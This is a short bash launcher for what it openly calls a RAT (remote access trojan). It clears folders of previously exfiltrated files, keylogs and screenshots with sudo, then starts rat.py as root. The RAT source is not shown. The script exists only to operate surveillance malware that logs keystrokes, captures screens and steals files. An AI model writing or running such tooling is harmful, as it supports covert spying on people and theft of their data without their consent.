#!/bin/bash

echo "Cleaning up exfiltration files..."
sudo rm ./files/*

echo "Cleaning up keylogs files..."
sudo rm ./keylogs/*

echo "Cleaning up screenshots files..."
sudo rm ./screenshots/*

echo "Starting RAT..."
sudo python3 ./rat.py
